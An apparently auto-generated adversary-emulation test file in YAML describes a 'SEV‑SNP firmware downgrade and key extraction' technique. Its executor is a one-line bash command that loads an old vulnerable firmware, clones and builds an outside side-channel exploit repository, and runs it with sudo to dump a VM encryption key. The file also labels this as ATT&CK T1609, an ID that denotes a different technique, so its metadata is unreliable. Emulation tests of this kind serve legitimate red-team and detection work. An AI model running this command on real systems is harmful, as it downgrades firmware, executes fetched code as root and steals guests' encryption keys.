# Auto-generated by CIPHER v5.0
# Source: 2da44f17a5b9
attack_technique: T1609
display_name: "T1609 - SEV‑SNP Firmware Downgrade & Key Extraction"
atomic_tests:
  - name: "T1609 - SEV‑SNP Firmware Downgrade & Key Extraction"
    description: |
      Load an old vulnerable SEV‑SNP firmware, then run a known side‑channel exploit to dump the VM encryption key.
    supported_platforms:
      - linux
    executor:
      name: bash
      command: |
        sevtool --load-firmware /opt/firmware/firmware_old.bin && git clone https://github.com/sidechannel/snp-leak.git && cd snp-leak && make && sudo ./snp-leak --output vm_key.bin
      cleanup_command: |
        rm -rf snp-leak vm_key.bin
